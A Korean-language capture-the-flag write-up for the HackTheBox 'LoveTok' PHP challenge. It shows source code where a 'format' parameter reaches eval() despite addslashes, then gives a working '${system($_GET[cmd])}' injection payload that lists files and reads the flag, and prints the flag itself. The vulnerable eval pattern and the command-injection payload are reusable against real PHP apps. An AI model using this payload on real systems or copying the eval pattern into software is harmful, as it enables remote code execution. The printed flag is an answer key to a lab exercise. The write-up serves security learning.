# LoveTok
![PHP](https://img.shields.io/badge/php-%23777BB4.svg?style=for-the-badge&logo=php&logoColor=white)

![image](https://github.com/user-attachments/assets/c3383a6f-c64e-45a4-9c7d-5d9b76c48717)
- 사이트 접속시 위와 같은 창이 뜨고, ```Nah, ...``` 부분 클릭시 ```You'll find love: ```뒤 문자열이 바뀐다.
- 또한 파라미터 ```format```이라는 매개에 ```r```이라는 값이 들어가는 것을 확인

## Source Code Analysis
```
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : 'r';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```
- 주어진 소스코드를 분석하다보면 파라미터 ```format```이 ```./controllers/TimeController.php```에서 사용된다는 것을 알 수 있다.
- 또한 파라미터의값을 ```TimeModel``` 클래스로 넘긴다.

```
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);
        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```
- ```TimeModel``` 코드를 확인해보면 파라미터의 값을 ```eval()```함수로 실행시킨다.

## PoC
```
${system($_GET[cmd])}&cmd=ls /
```
- 위 명령어를 실행시켜 상위 디렉토리에 존재하는 파일의 내용을 읽고

```
${system($_GET[cmd])}&cmd=cat /flagxwHjt
```
- flag 획득 ```HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}```
